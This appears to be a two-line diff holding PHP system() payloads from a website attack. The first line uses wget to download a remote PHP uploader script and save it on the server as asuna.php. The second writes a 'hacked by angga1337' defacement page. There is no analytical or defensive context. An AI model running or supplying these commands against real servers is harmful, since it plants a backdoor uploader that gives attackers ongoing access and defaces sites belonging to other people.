@@ -1,0 +1,2 @@
+<pre>system('wget https://raw.githubusercontent.com/anggamaulani/uploaderphp/main/upload.php -O asuna.php')</pre>
+<pre>system('echo "hacked by angga1337" > z.htm')</pre>
